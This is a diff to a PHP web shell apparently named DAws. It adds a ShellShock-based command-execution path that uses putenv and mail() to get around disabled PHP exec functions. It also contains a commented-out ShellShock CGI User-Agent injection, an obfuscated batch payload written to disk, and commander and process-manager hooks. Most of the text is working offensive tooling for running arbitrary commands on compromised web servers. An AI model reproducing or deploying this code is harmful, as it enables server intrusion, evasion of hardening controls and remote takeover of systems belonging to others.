@@ -85,7 +85,14 @@ $parts = explode("/", $_SERVER['PHP_SELF']);
 $dirNumber = count($parts) - 2;
 
 $current = getcwd();
-$parts2 = explode("/", $current);
+if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
+{
+	$parts2 = explode("\\", $current);
+}
+else
+{
+	$parts2 = explode("/", $current);
+}
 
 for ($i=0; $i<$dirNumber; $i++)
 {
@@ -491,27 +498,10 @@ function findSmallest($i, $end, $data)
 }
 #-->
 
-#Substitute for file_get_contents using Curl-->
-function url_get_contents($url)
-{
-	global $curl_version;
-
-	if ($curl_version == True)
-	{
-		$ch = curl_init(str_replace(" ","%20",$url));
-		curl_setopt($ch, CURLOPT_URL, $url);
-		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-		$output = curl_exec($ch);
-		curl_close($ch);
-		return $output;
-	}
-}
-#<--
-
 #Checks if what's appended is Installed on the system-->
 function soft_exists($command)
 {
-	global $shell_exec, $exec, $popen, $proc_open, $cgi, $curl_version;
+	global $shell_exec, $exec, $popen, $proc_open, $cgi, $shsh;
 	$whereIsCommand = (PHP_OS == 'WINNT') ? 'where' : 'which';
 
 	$complete = "$whereIsCommand $command";
@@ -561,14 +551,11 @@ function soft_exists($command)
 	else if($cgi == True)
 	{
 		$complete = base64encoding($complete);
-		if ($curl_version == True)
-		{
-			return url_get_contents($_SESSION["onlinecgi"]."?command=$complete");
-		}
-		else
-		{
-			return file_get_contents($_SESSION["onlinecgi"]."?command=$complete");
-		}	
+		return cgi_url_get_contents($_SESSION["onlinecgi"]."?command=$complete");
+	}
+	else if($shsh == True)
+	{
+		return shsh($complete);
 	}
 	else
 	{
@@ -587,7 +574,7 @@ $perl = "";
 #Executes system commands -->
 function evalRel($command)
 {
-	global $shell_exec, $exec, $popen, $proc_open, $system, $passthru, $cgi, $curl_version;
+	global $shell_exec, $exec, $popen, $proc_open, $system, $passthru, $cgi, $shsh;
 	if ($system == True)
 	{
 		system($command);
@@ -649,14 +636,11 @@ function evalRel($command)
 	else if($cgi == True)
 	{
 		$command = base64encoding($command);
-		if ($curl_version == True)
-		{
-			echo url_get_contents($_SESSION["onlinecgi"]."?command=$command");
-		}
-		else
-		{
-			echo file_get_contents($_SESSION["onlinecgi"]."?command=$command");
-		}	
+		echo cgi_url_get_contents($_SESSION["onlinecgi"]."?command=$command");
+	}
+	else if($shsh == True)
+	{
+		return shsh($command);
 	}
 	else
 	{
@@ -713,7 +697,7 @@ $htaccess="bi4QBzgRCA0AABZPFwQZXRUKHgwUG1RNAxhGRw4EEGU7EwQZCQcfRU8qDAYTMyEgZg=="
 
 $cgish="R05bARkeSQsNFgxlfgYTGAlJTiYLAQAGHgRLHRUVAVVUFxUIEkYEEQkDVmkVEw4GTEdGZX4AHx0LCAIBWQ8RABgfRktINDEqJjovIzI7JSsjTVQfUAMDDUxICk9TEF8uSEMPCgkCFQ0UTTpBNztCMl4/WV5MTUM5VUAERFAMRgsNFgFZQENdXQIMDwoAClQfUAMDDUxHF0BRUUBfRkYLR0QTVBAVFEZLH0pPQFRMF1IGYwkTBQNURxMfCwQNCwA=";
 
-$cgibat="JAoXCx9QCQ8Kb24KFwsfUCUGAhEBAQBOBAkWDFZFEAoMF18YEgQAbwEMHAxQXmxjCQYMAFQ9TBgSBAA7WjFICxURAjdSO1gbHRccFThXKCQTHFROUDMhIEwnBRsXC1AjDgwACTpTWxcZBAoMMls6U1sLFRECN1I7WA0bBwkuWDdQBgEBAAYCLlg3UA1QMUonMQcVSUFFJyg9QzIREgoERTcHEQ8cLlpGBFE6USpfFh8UBEwEBxsdDB5NQS0tEhdBFgIEV0YECREMABBeVzcjPUs7WjFIFxESCgwyWzpTAAcuTiUGAQgFARBZUC5aRhgBOlEqXwQUOFcyWQ0BBBYEUBIQHABZSAAGCARBSQIECQpJRBMfCwQNCwBIKl0uTEkdCDtaMUgXFC5YN1AMCh8BF1AEHxkJWEMcAQEdGRJOTAsFAhFeVzcJTkwTBQMBBk1XIQZLSjpRKl9fBAI3UjtYQAACEhwDN1I7WEASDAIdOFdmb24GEkM+PzJJTkA1OjExKS81PT4sKihRQVBNW0lOR25HfmpVITMsPjw7PCAxOT4hUxJdQWVdaXoVBQEDRTpTWwAVHhIMHjtaMUhMEh8CEDJbOlNbCwQdCjdS";
+$cgibat="JAoXCx9QCQ8Kb24KFwsfUCUGAhEBAQBOBAkWDFZFEAoMF18YEgQAbwEMHAxeemwACkUqICBDUlU3PCk3PTAnNyI5KC5JR0RSSUNSUkZBZmwNCVQGCBkVHUwBAQwbBxVeEhEYRQAKGEMUFQUGCABKGwwXenlODA8NC09RMiU1NDAzNjA9PS03ShhRSUxEUVQGHhMJDQkBShsMF3p5BQweEREbHQ9QXQIMDwoAClRBFR4FBggAAEEAGwRSRksIAAcAEAZeBB4dTm9tBhJDFQgPGhhFAAoXDBQVSB0UEURHfmp5BB8ZCUUAChcMFBVIHRQRRGV9SlAVChoJRUxlfWoVEw4GTCYLGhgHUB4JHUwCARtUDAUEFhwYRW5mXWlZ";
 #<--
 
 #Encrypted Shells and Tools--> 
@@ -736,7 +720,7 @@ $bpscanp =
 #<--
 
 #Dynamic Booleans (True=Enabled/False=Disabled)-->
-$php_functions = array("exec", "shell_exec", "passthru", "system", "popen", "proc_open");
+$php_functions = array("exec", "shell_exec", "passthru", "system", "popen", "proc_open", "putenv", "mail");
 foreach($php_functions as $function)
 {
 	if(checkIt($function))
@@ -786,6 +770,160 @@ foreach($softwares as $function)
 }
 #<--
 
+#Shell Shock - CGI (Still working on it)-->
+/*
+function shshExec($url, $command)
+{
+	global $curl_version;
+
+	if ($curl_version == True)
+	{
+		$ch = curl_init(str_replace(" ","%20",$url));
+		curl_setopt($ch, CURLOPT_URL, $url);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+		curl_setopt($ch,CURLOPT_USERAGENT, "() { test;};echo \"Content-type: text/plain\"; echo; echo; $command;");
+		$output = curl_exec($ch);
+		curl_close($ch);
+		return $output;
+	}
+	else
+	{
+
+		$opts = array(
+  			'http'=>array(
+    			'method'=>"GET",
+    			'header'=> "User-Agent: () { test;};echo \"Content-type: text/plain\"; echo; echo; $command;\r\n" 
+  			)
+		);
+
+		$context = stream_context_create($opts);
+
+		return file_get_contents($url, false, $context);
+	}
+}
+
+$shsh = False;
+$cgidefaultlocarray = array("/etc/apache2/sites-available/default", "/usr/local/apache/conf/original/httpd.conf", "/etc/httpd/conf/original/httpd.conf");
+$cgidefaultloc = "";
+$cgiscriptalias = "";
+$cgidir = "";
+
+foreach ($cgidefaultlocarray as $value)
+{
+	if (file_exists($value))
+	{
+		$cgidefaultloc = $value;
+		break;
+	}
+}
+
+echo "Default: ".$cgidefaultloc."\n";
+
+if (($cgidefaultloc != "") && (is_readable($cgidefaultloc)))
+{
+	$lines = file($cgidefaultloc);
+	foreach ($lines as $value)
+	{
+		if(strpos($value,'ScriptAlias') !== false)
+		{
+			$value = str_replace("ScriptAlias ", "", $value);
+			$parts = explode(" ",$value);
+			$cgiscriptalias = trim($parts[0], "	");
+			$cgidir = substr($parts[1], 0, -1);
+			break;
+		}
+	}
+	
+	echo "Script Alias: ".$cgiscriptalias."\n";
+	echo "Dir: ".$cgidir."\n";
+
+	if (($cgidir != "") && (is_readable($cgidir)))
+	{
+		$files = scandir($cgidir, 1);
+		$extensions = array(".sh", ".cgi", ".pl", ".rb", ".py", ".php");
+		$found = False;
+		$rapedfile = "";
+		foreach ($files as $value)
+		{
+			foreach ($extensions as $extension)
+			{
+				if(strpos($value,$extension) !== false)
+				{
+					$found = True;
+					break;
+				}
+			}
+			if ($found == True)
+			{
+				$rapedfile = $value;
+				break;
+			}
+		}
+		if ($rapedfile != "")
+		{
+			$rapedfile = "http://".$_SERVER['SERVER_NAME'].$cgiscriptalias.$rapedfile;
+
+			echo "Raped File: ".$rapedfile."\n";
+
+			$tempoutput = shshExec($rapedfile, "echo dotcppfile and Aces");
+
+			echo "Output: ".$tempoutput."\n";
+
+			if(strpos($tempoutput,"dotcppfile and Aces") !== false)
+			{
+				$shsh = True;
+			}
+		}
+	}
+}
+*/
+
+#ShellShock - Mail (Credits goes to Dyme for implementing this in DAws and Starfall for the code)-->
+function shsh($command)
+{
+	global $writeread_dir;
+
+	$output = "";
+	$filename = $writeread_dir .rand(1,1000) . ".data";
+	putenv("PHP_LOL=() { x; }; $cmd >$filename 2>&1");
+	mail("a@127.0.0.1","","","","-bv");
+	if (file_exists($filename))
+	{
+		$output = file_get_contents($filename);
+		unlink($filename);
+	}
+
+	return $output;
+}
+
+$shsh = False;
+if ((strstr(readlink("/bin/sh"), "bash") != FALSE) && ($putenv == True) && ($mail == True) && (shsh("echo Dyme and Starfall") == "Dyme and Starfall"))
+{
+	$shsh = True;
+}
+#<--
+
+#CGI URL Get Contents-->
+function cgi_url_get_contents($url)
+{
+	global $curl_version;
+
+	if ($curl_version == True)
+	{
+		$ch = curl_init(str_replace(" ","%20",$url));
+		curl_setopt($ch, CURLOPT_URL, $url);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+		$output = curl_exec($ch);
+		curl_close($ch);
+		return $output;
+	}
+	else
+	{
+		return file_get_contents($url);
+	}
+}
+#<--
+
 #CGI Incoming-->
 $_SESSION["onlinecgi"] = "";
 $_SESSION["cgi"] = False;
@@ -802,10 +940,11 @@ if ($_SESSION["cgi"] == False)
 
 		file_put_contents($writeread_dir."cgi\\.htaccess",unsh3ll_this($htaccess));
 
-		file_put_contents($writeread_dir."cgi\\DAws.sh",unsh3ll_this($cgish));
-		chmod($writeread_dir."cgi\\DAws.sh", 0755);
-		
-		$_SESSION["onlinecgi"] = str_replace("$real_path", "", $writeread_dir."cgi\\DAws.sh");
+		file_put_contents($writeread_dir."cgi\\DAws.bat",unsh3ll_this($cgibat));
+		chmod($writeread_dir."cgi\\DAws.bat", 0755);
+
+		$_SESSION["onlinecgi"] = str_replace("$real_path", "", $writeread_dir."cgi/DAws.bat");
+		$_SESSION["onlinecgi"] = str_replace("\\", "/", $_SESSION["onlinecgi"]);
 		$_SESSION["onlinecgi"] = "http://".$_SERVER['SERVER_NAME']."/".$_SESSION["onlinecgi"];	
 
 		$_SESSION["cgi"] = True;
@@ -829,14 +968,8 @@ if ($_SESSION["cgi"] == False)
 	}
 }
 
-if ($curl_version == True)
-{
-	$tempoutput = url_get_contents($_SESSION["onlinecgi"]."?command=ZGly");
-}
-else
-{
-	$tempoutput = file_get_contents($_SESSION["onlinecgi"]."?command=ZGly");
-}
+
+$tempoutput = cgi_url_get_contents($_SESSION["onlinecgi"]."?command=ZGly");
 
 if (($tempoutput != "") && (!strpos($tempoutput,'Internal') !== false))
 {
@@ -1355,7 +1488,7 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 			else 
 			{
 				echo "";
-			}			
+			}
 		}
 		else if($proc_open == True)
 		{
@@ -1418,16 +1551,7 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 		else if($cgi == True)
 		{
 			$tempcommand = base64encoding('typeperf -sc 1 "\processor(_total)\% processor time"');
-
-			if ($curl_version == True)
-			{
-				$stdout = url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");
-			}
-			else
-			{
-				$stdout = file_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");
-			}
-
+			$stdout = cgi_url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");
 			$parts = explode(",", $stdout);
 			if(isset($parts[2]))
 			{
@@ -1443,6 +1567,35 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 					{ 
 						echo "";
 					}
+				}
+				else 
+				{
+					echo "";
+				}
+			}
+			else 
+			{
+				echo "";
+			}
+		}
+		else if($shsh == True)
+		{
+			$data = shsh('typeperf -sc 1 "\processor(_total)\% processor time"');
+			$parts = explode(",", $data);
+			if(isset($parts[2]))
+			{
+				$get_first = explode(",", $data);
+				if(isset($get_first[2]))
+				{
+					$first = str_replace("\"", "", $get_first[2]);
+					if(isset($first[0]))
+					{
+						echo "<td>".round(explode("\n", $first[0]))."% </td>";
+					}					
+					else
+					{ 
+						echo "";
+					}				
 				}
 				else 
 				{
@@ -1515,14 +1668,11 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 		else if($cgi == True)
 		{
 			$tempcommand = base64encoding("grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage \"\"}'");
-			if ($curl_version == True)
-			{
-				echo "<td>".round(url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand"))."%</td>\n";
-			}
-			else
-			{
-				echo "<td>".round(file_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand"))."%</td>\n";
-			}		
+			echo "<td>".round(cgi_url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand"))."%</td>\n";	
+		}
+		else if($shsh == True)
+		{
+			echo "<td>".round(shsh("grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage \"\"}'"))."%</td>\n";
 		}
 		else
 		{
@@ -1606,15 +1756,14 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 		else if($cgi == True)
 		{
 			$tempcommand = base64encoding("free -mt | grep Mem |awk '{print $2}'");
-			if ($curl_version == True)
-			{
-				$stdout = url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");
-			}
-			else
-			{				
-				$stdout = file_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");
-			}			
+			$stdout = cgi_url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");	
 			$total_ram = $stdout;
+			$total_ram = $total_ram /1024;
+			echo "<td>" . round($total_ram) . " GB</td>\n";
+		}
+		else if($shsh == True)
+		{
+			$data = shsh("free -mt | grep Mem |awk '{print $2}'");
 			$total_ram = $total_ram /1024;
 			echo "<td>" . round($total_ram) . " GB</td>\n";
 		}
@@ -1688,15 +1837,13 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 		else if($cgi == True)
 		{
 			$tempcommand = base64encoding("wmic OS get FreePhysicalMemory /Value");
-			if ($curl_version == True)
-			{
-				$stdout = url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");
-			}
-			else
-			{
-				$stdout = file_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");
-			}		
+			$stdout = cgi_url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");		
 			$free_ram = (int)str_replace("FreePhysicalMemory=", "", $stdout) /1024 /1024;
+			echo "<td>" . round($free_ram, 2) . "GB </td>";
+		}
+		else if($shsh == True)
+		{
+			$free_ram = (int)str_replace("FreePhysicalMemory=", "", shsh("wmic OS get FreePhysicalMemory /Value")) /1024 /1024;
 			echo "<td>" . round($free_ram, 2) . "GB </td>";
 		}
 		else
@@ -1761,15 +1908,13 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 		else if($cgi == True)
 		{
 			$tempcommand = base64encoding("free | grep Mem | awk '{print $3/$2 * 100.0}'");
-			if ($curl_version == True)
-			{
-				$stdout = url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");
-			}
-			else
-			{
-				$stdout = file_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");
-			}			
+			$stdout = cgi_url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");		
 			$free_ram = $stdout;
+			echo "<td>" . round($free_ram) . "% </td>\n";
+		}
+		else if($shsh == True)
+		{
+			$free_ram = shsh("free | grep Mem | awk '{print $3/$2 * 100.0}'");
 			echo "<td>" . round($free_ram) . "% </td>\n";
 		}
 		else
@@ -2051,7 +2196,7 @@ else if(isset($_GET["zip"]))
 			{
 				if(evalRel("zip -r $archiveName $archiveName")=="False")
 				{
-					echo "<p class='danger'>Can't Zip because 'exec', 'shell_exec', 'system', 'passthru', `popen`, `proc_open` and `cgi` are Disabled.</p>";
+					echo "<p class='danger'>Can't Zip because 'exec', 'shell_exec', 'system', 'passthru', `popen`, `proc_open`, `cgi` and `shellshock` are Disabled.</p>";
 					$zipFail = True;
 				}
 
@@ -2466,7 +2611,7 @@ else
 }
 
 #Commander-->
-if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True))
+if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True) || ($shsh == True))
 {
 echo "
 <br><h3><A NAME='Commander' href=\"#Commander\">Commander</A></h3>";
@@ -2486,6 +2631,7 @@ if(isset($_POST["passthru"])) $_SESSION["command_function"] = "passthru";
 if(isset($_POST["popen"])) $_SESSION["command_function"] = "popen";
 if(isset($_POST["proc_open"])) $_SESSION["command_function"] = "proc_open";
 if(isset($_POST["cgi"])) $_SESSION["command_function"] = "cgi";
+if(isset($_POST["shsh"])) $_SESSION["command_function"] = "shsh";
 if(!isset($_SESSION["command_function"])) $_SESSION["command_function"] = "system";
 
 if($system == True)
@@ -2569,6 +2715,18 @@ if ($cgi == True)
 	echo '<input type="submit" name="cgi" value="CGI" '; 
 	
 	if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "cgi")
+	{
+		echo ' style="background-color: red;"';
+	}
+
+	echo "> ";
+}
+
+if ($shsh == True)
+{
+	echo '<input type="submit" name="shsh" value="ShellShock" '; 
+	
+	if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "shsh")
 	{
 		echo ' style="background-color: red;"';
 	}
@@ -2679,17 +2837,15 @@ else
 			if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "cgi")
 			{
 				$decCommand = base64encoding($decCommand);
-				if ($curl_version == True)
-				{
-					$response = url_get_contents($_SESSION["onlinecgi"]."?command=$decCommand");
-				}
-				else
-				{
-					$response = file_get_contents($_SESSION["onlinecgi"]."?command=$decCommand");
-				}				
+				$response = cgi_url_get_contents($_SESSION["onlinecgi"]."?command=$decCommand");				
 				$decCommand = base64decoding($decCommand);
 			}
-		
+
+			if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "shsh")
+			{
+				$response = shsh($decCommand." 2>&1");		
+			}
+
 			echo "<table class='flat-table flat-table-1'>";
 			echo "<tr><td>".$decCommand."</td>";
 			echo "<td><pre>";
@@ -2724,7 +2880,7 @@ echo "
 	<select name=\"language\">
 		
 		<option value='php'>PHP</option>";	
-		if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($cgi == True))
+		if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($cgi == True) || ($shsh == True))
 		{
 			if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN')
 			{
@@ -2824,7 +2980,7 @@ if(isset($_POST["run"]))
 		runPHP($decEval);
 	}
 	
-	if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True))
+	if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True) || ($shsh == True))
 	{
 
 		if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
@@ -2955,7 +3111,7 @@ if(isset($_POST["run"]))
 #<--
 
 #Process Manager-->
-if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True))
+if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True) || ($shsh == True))
 {
 echo "
 <br><br><h3><A NAME='Process Manager' href=\"#Process Manager\">Process Manager</A></h3>";
@@ -3015,14 +3171,11 @@ if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
 		else if ($cgi == True)
 		{
 			$tempcommand = base64encoding("taskkill /F /PID " . $_GET["kill"] . " 2>&1");
-			if ($curl_version == True)
-			{
-				$kill = url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");
-			}
-			else
-			{
-				$kill = file_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");
-			}
+			$kill = cgi_url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");
+		}
+		else if($shsh == True)
+		{
+			$kill = shsh("taskkill /F /PID " . $_GET["kill"] . " 2>&1");
 		}
 		else
 		{
@@ -3093,14 +3246,12 @@ if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
 	else if ($cgi == True)
 	{
 		$tempcommand = base64encoding("tasklist");
-		if ($curl_version == True)
-		{
-			$process_list = url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");
-		}
-		else
-		{
-			$process_list = file_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");
-		}		
+		$process_list = cgi_url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");		
+		$processes = explode("\n", $process_list);
+	}
+	else if ($shsh == True)
+	{
+		$process_list = shsh("tasklist");
 		$processes = explode("\n", $process_list);
 	}
 	else
@@ -3195,19 +3346,16 @@ else
 		else if ($cgi == True)
 		{
 			$tempcommand = base64encoding("kill $pid 2>&1");
-			if ($curl_version == True)
-			{
-				$output = url_get_contents($_SESSION["onlinecgi"]."?command=$base64encoding");
-			}
-			else
-			{
-				$output = file_get_contents($_SESSION["onlinecgi"]."?command=$base64encoding");
-			}		
+			$output = cgi_url_get_contents($_SESSION["onlinecgi"]."?command=$base64encoding");		
+		}
+		else if ($shsh == True)
+		{
+			$output = shsh("kill $pid 2>&1");
 		}
 		else
 		{
 			$output = "Fail";
-		}		
+		}
 
 		if(empty($output))
 		{
@@ -3273,15 +3421,13 @@ else
 	else if ($cgi == True)
 	{
 		$tempcommand = base64encoding("ps aux");
-		if ($curl_version == True)
-		{			
-			$process_list = url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");
-		}
-		else
-		{		
-			$process_list = file_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");
-		}		
+		$process_list = cgi_url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");		
 		$processes = explode("\n", $process_list);
+	}
+	else if($shsh == True)
+	{
+		$process_list = shsh("ps aux");
+		$processes = explode("\n", $process_list);	
 	}
 	else
 	{
@@ -3695,7 +3841,7 @@ if(isset($_GET["tool"]) && ($_GET["tool"] == "bpscanp"))
 
 <?php
 
-if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True))
+if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True) || ($shsh == True))
 {
 echo "
 <table class='flat-table flat-table-3'>
@@ -3733,7 +3879,7 @@ echo "
 		<td>Description</td>
 		<td>Action</td>
 	</tr>";
-if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True))
+if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True) || ($shsh == True))
 {
 	echo "
 	<form action='?tool=bpscan#Tools' method='post' >
